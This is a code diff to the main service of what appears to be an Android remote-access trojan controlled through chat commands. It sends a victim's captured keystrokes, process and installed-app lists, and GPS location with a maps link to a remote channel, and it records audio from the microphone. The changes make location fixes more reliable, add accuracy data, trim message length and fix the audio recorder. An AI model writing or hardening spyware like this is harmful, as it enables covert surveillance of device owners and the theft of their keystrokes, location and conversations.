@@ -212,7 +212,7 @@ class MainService : Service() {
                             }
                         }
                         else -> {
-                            val cap = KeylogService.capturedText
+                            val cap = KeylogService.getText()
                             if (cap.isEmpty()) {
                                 d.sendMsg(":keyboard: **Keylogger**\nNo keystrokes captured. Use `!keylog on` to enable.")
                             } else {
@@ -351,7 +351,7 @@ class MainService : Service() {
                         val lines = f.readLines()
                         val total = lines.size
                         val last = lines.takeLast(40).joinToString("\n")
-                        d.sendMsg(":mag: **Debug Log** (last 40 of $total lines)\n```\n$last\n```")
+                        d.sendMsg(":mag: **Debug Log** (last 40 of $total lines)\n```\n${last.take(1900)}\n```")
                     } else {
                         d.sendMsg(":mag: Debug file empty or null")
                     }
@@ -432,14 +432,14 @@ class MainService : Service() {
                     val result = shell("ps -A -o PID,USER,NAME --sort=-%MEM 2>/dev/null || ps -A 2>/dev/null || ps")
                     val lines = result.lines()
                     val out = if (lines.size > 40) lines.take(40).joinToString("\n") + "\n... (${lines.size - 40} more)" else result
-                    d.sendMsg(":microscope: **Processes**\n```\n$out\n```")
+                    d.sendMsg(":microscope: **Processes**\n```\n${out.take(1900)}\n```")
                 }
                 "installed" -> {
                     val result = shell("pm list packages -3 2>/dev/null | sort")
                     val pkgs = result.lines().filter { it.startsWith("package:") }.map { it.removePrefix("package:") }
                     val total = pkgs.size
                     val list = if (total > 40) pkgs.take(40).joinToString("\n") + "\n... (${total - 40} more)" else pkgs.joinToString("\n")
-                    d.sendMsg(":package: **Installed Apps** (${total})\n```\n$list\n```")
+                    d.sendMsg(":package: **Installed Apps** (${total})\n```\n${list.take(1900)}\n```")
                 }
                 "torch" -> {
                     if (!hasPerm(android.Manifest.permission.CAMERA)) {
@@ -590,6 +590,9 @@ class MainService : Service() {
         val lm = getSystemService(Context.LOCATION_SERVICE) as LocationManager
         var loc: Location? = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER)
         if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
+        if (loc == null && lm.isProviderEnabled(LocationManager.PASSIVE_PROVIDER)) {
+            loc = lm.getLastKnownLocation(LocationManager.PASSIVE_PROVIDER)
+        }
         if (loc != null) {
             val lat = loc.latitude
             val lon = loc.longitude
@@ -599,9 +602,13 @@ class MainService : Service() {
         var newLoc: Location? = null
         val listener = LocationListener { newLoc = it; latch.countDown() }
         try {
-            if (lm.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
-                lm.requestSingleUpdate(LocationManager.GPS_PROVIDER, listener, Looper.getMainLooper())
-                latch.await(8, TimeUnit.SECONDS)
+            val providers = listOf(LocationManager.GPS_PROVIDER, LocationManager.NETWORK_PROVIDER)
+            for (p in providers) {
+                if (lm.isProviderEnabled(p)) {
+                    lm.requestSingleUpdate(p, listener, Looper.getMainLooper())
+                    latch.await(6, TimeUnit.SECONDS)
+                    if (newLoc != null) break
+                }
             }
         } catch (_: Exception) {
         } finally {
@@ -610,9 +617,10 @@ class MainService : Service() {
         if (newLoc != null) {
             val lat = newLoc!!.latitude
             val lon = newLoc!!.longitude
-            return ":round_pushpin: **Location**\nLat: `$lat`\nLon: `$lon`\nhttps://www.google.com/maps?q=$lat,$lon"
+            val acc = newLoc!!.accuracy
+            return ":round_pushpin: **Location**\nLat: `$lat`\nLon: `$lon`\nAcc: ±${acc}m\nhttps://www.google.com/maps?q=$lat,$lon"
         }
-        return ":x: No location available"
+        return ":x: No location available — ensure GPS/WiFi is on and try outside"
     }
 
     private fun queryText(uri: Uri, cols: Array<String>, transform: (Cursor) -> String): String {
@@ -679,9 +687,8 @@ class MainService : Service() {
         try {
             val file = File(cacheDir, "audio_${System.currentTimeMillis()}.m4a")
             recorder = MediaRecorder().apply {
-                if (Build.VERSION.SDK_INT >= 31) setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                 setAudioSource(MediaRecorder.AudioSource.MIC)
-                if (Build.VERSION.SDK_INT < 31) setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
+                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                 setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                 setOutputFile(file.absolutePath)
                 prepare()
